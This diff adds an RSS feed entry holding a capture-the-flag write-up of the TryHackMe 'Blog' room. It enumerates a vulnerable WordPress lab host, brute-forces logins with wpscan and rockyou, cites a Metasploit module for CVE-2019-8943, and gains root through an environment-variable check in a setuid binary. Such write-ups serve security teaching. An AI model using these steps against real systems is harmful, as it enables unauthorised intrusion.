@@ -6,7 +6,133 @@
     <description>Recent content in Posts on chaos</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Fri, 28 Oct 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://mychaos.me/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Wed, 12 Jul 2023 20:28:56 +0100</lastBuildDate><atom:link href="https://mychaos.me/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Blog</title>
+      <link>https://mychaos.me/posts/blog/</link>
+      <pubDate>Wed, 12 Jul 2023 20:28:56 +0100</pubDate>
+      
+      <guid>https://mychaos.me/posts/blog/</guid>
+      <description>a TryHackMe room about a vulnerable wordpress blog
+ Solution Before we proceed, let&amp;rsquo;s start with the initial steps. We&amp;rsquo;ll begin by adding our Machine IP to the /etc/hosts file as &amp;ldquo;blog.thm&amp;rdquo;. Once that&amp;rsquo;s done, we can run our reliable nmap scan.
+Nmap scan report for &amp;lt;IP&amp;gt; Not shown: 998 closed ports 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack Apache httpd 2.</description>
+      <content>&lt;p&gt;&lt;a href=&#34;https://tryhackme.com/room/blog&#34;&gt;&lt;img src=&#34;https://readme-typing-svg.demolab.com?font=Fira+Code&amp;amp;pause=1000&amp;amp;width=435&amp;amp;lines=Blog&#34; alt=&#34;Blog&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;a TryHackMe room about a vulnerable wordpress blog&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;
+&lt;p&gt;Before we proceed, let&amp;rsquo;s start with the initial steps. We&amp;rsquo;ll begin by adding our Machine IP to the /etc/hosts file as &amp;ldquo;blog.thm&amp;rdquo;. Once that&amp;rsquo;s done, we can run our reliable nmap scan.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &amp;lt;IP&amp;gt;
+Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; closed ports
+22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+80/tcp  open  http        syn-ack Apache httpd 2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
+|_http-generator: WordPress 5.0
+| http-robots.txt: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; disallowed entry
+|_/wp-admin/
+|_http-server-header: Apache/2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_http-title: Billy Joel&amp;amp;&lt;span style=&#34;color:#75715e&#34;&gt;#039;s IT Blog &amp;amp;#8211; The IT blog&lt;/span&gt;
+139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We have both HTTP and SMB services open. Now, let&amp;rsquo;s take a look at the SMB share.&lt;/p&gt;
+&lt;h3 id=&#34;smb&#34;&gt;SMB&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;» smbmap.py -H &amp;lt;IP&amp;gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Finding open SMB ports....
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Guest SMB session established on &amp;lt;IP&amp;gt;...
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; IP: &amp;lt;IP&amp;gt;:445 Name: blog.thm
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        BillySMB                                                READ, WRITE     Billy&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;s local SMB Share
+        IPC$                                                    NO ACCESS       IPC Service &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;blog server &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Samba, Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We&amp;rsquo;ll try to retrieve the files from the BillySMB share since it stands out among the others.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;» smbclient //10.10.29.18/BillySMB
+Try &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt; to get a list of possible commands.
+smb: &lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;gt;&lt;/span&gt; dir
+  .                                   D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Sat Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; 00:52:57 &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;
+  ..                                  D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue May &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 19:58:23 &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;
+  Alice-White-Rabbit.jpg              N    &lt;span style=&#34;color:#ae81ff&#34;&gt;33378&lt;/span&gt;  Tue May &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 20:17:01 &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;
+  tswift.mp4                          N  &lt;span style=&#34;color:#ae81ff&#34;&gt;1236733&lt;/span&gt;  Tue May &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 20:13:45 &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;
+  check-this.png                      N     &lt;span style=&#34;color:#ae81ff&#34;&gt;3082&lt;/span&gt;  Tue May &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 20:13:43 &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;
+
+                &lt;span style=&#34;color:#ae81ff&#34;&gt;15413192&lt;/span&gt; blocks of size 1024. &lt;span style=&#34;color:#ae81ff&#34;&gt;9737512&lt;/span&gt; blocks available
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If we download the files we don’t see anything obvious. We can check the jpg with stegsolve&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;» steghide extract -sf Alice-White-Rabbit.jpg
+Enter passphrase:
+wrote extracted data to &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rabbit_hole.txt&amp;#34;&lt;/span&gt;.
+» cat rabbit_hole.txt
+You&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;ve found yourself in a rabbit hole, friend.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Since the SMB exploration seems unproductive, let&amp;rsquo;s now focus on checking out the HTTP server.&lt;/p&gt;
+&lt;h3 id=&#34;http&#34;&gt;HTTP&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.ibb.co/Ldpznw0/blog-index.png&#34; alt=&#34;blog&#34;&gt;&lt;/p&gt;
+&lt;p&gt;When we visit the website, we see a basic blog, and we know it&amp;rsquo;s running on WordPress based on the room description.
+We can use the wpscan tool to scan the WordPress website and gather information. Let&amp;rsquo;s perform a wpscan scan, focusing only on the essential details.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;» wpscan --url blog.thm -e u
+Interesting Finding&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;:
+
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; WordPress version 5.0 identified &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Insecure, released on 2018-12-06&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+ | Found By: Rss Generator &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Passive Detection&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+ |  - http://blog.thm/feed/, &amp;lt;generator&amp;gt;https://wordpress.org/?v&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;5.0&amp;lt;/generator&amp;gt;
+ |  - http://blog.thm/comments/feed/, &amp;lt;generator&amp;gt;https://wordpress.org/?v&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;5.0&amp;lt;/generator&amp;gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Enumerating Users &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;via Passive and Aggressive Methods&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+ Brute Forcing Author IDs - Time: 00:00:00 &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;========================================================================================&lt;/span&gt;&amp;gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; / 10&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 100.00% Time: 00:00:00
+
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; User&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Identified:
+
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; kwheel
+ | Found By: Author Posts - Author Pattern &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Passive Detection&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+ | Confirmed By:
+ |  Wp Json Api &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+ |   - http://blog.thm/wp-json/wp/v2/users/?per_page&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;100&amp;amp;page&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+ |  Author Id Brute Forcing - Author Pattern &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+ |  Login Error Messages &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; bjoel
+ | Found By: Author Posts - Author Pattern &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Passive Detection&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+ | Confirmed By:
+ |  Wp Json Api &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+ |   - http://blog.thm/wp-json/wp/v2/users/?per_page&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;100&amp;amp;page&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+ |  Author Id Brute Forcing - Author Pattern &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+ |  Login Error Messages &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can see that there are two users, bjoel and kwheel. Let&amp;rsquo;s try to brute force the password for both users.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;» wpscan --url blog.thm -U kwheel,bjoel -P /opt/wordlists/rockyou.txt --password-attack wp-login -t &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;
+&amp;lt;RANDOM THINGS&amp;gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;SUCCESS&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; - kwheel / &amp;lt;REDACTED&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After about two minutes, we managed to successfully acquire a user account, which we can now utilize to gain shell access.&lt;/p&gt;
+&lt;h3 id=&#34;cve-2019-8943---metasploit&#34;&gt;CVE-2019-8943 - Metasploit&lt;/h3&gt;
+&lt;p&gt;Metasploit has a module that exploits this vulnerability, allowing us to obtain a shell.
+exploit/multi/http/wp_crop_rce&lt;/p&gt;
+&lt;h3 id=&#34;shell&#34;&gt;SHELL&lt;/h3&gt;
+&lt;p&gt;Now that we have a shell, we can check for other users on the system.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ ls /home
+bjoel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h3&gt;
+&lt;p&gt;While searching the system, we couldn&amp;rsquo;t find a way to access bjoel directly. However, we did notice an interesting setuid binary located in /usr/sbin that caught our attention.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ /usr/sbin/checker
+Not an Admin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can see that the binary is checking if the user is an admin or not. Let&amp;rsquo;s take a look at the binary in Ghidra.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;) {
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;adminEnv &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getenv(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt;);
+
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (adminEnv &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;) {
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Not an Admin&amp;#34;&lt;/span&gt;);
+  } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+    setuid(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
+    system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;);
+  }
+
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After analyzing the program, we observe that it retrieves the value of the &amp;ldquo;admin&amp;rdquo; environment variable and verifies if it is not null. To bypass this check, we can simply set the &amp;ldquo;admin&amp;rdquo; environment variable to any value of our choice.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ admin&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;a /usr/sbin/checker
+id
+uid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; gid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;33&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;www-data&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; groups&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;33&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;www-data&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With the ability to bypass the previous program&amp;rsquo;s check, we can now proceed to read the root flag. Additionally, we can explore bjoel&amp;rsquo;s files and discover his hidden user flag located in /media.&lt;/p&gt;
+</content>
+    </item>
+    
     <item>
       <title>HackTheBoo</title>
       <link>https://mychaos.me/posts/hacktheboo/</link>
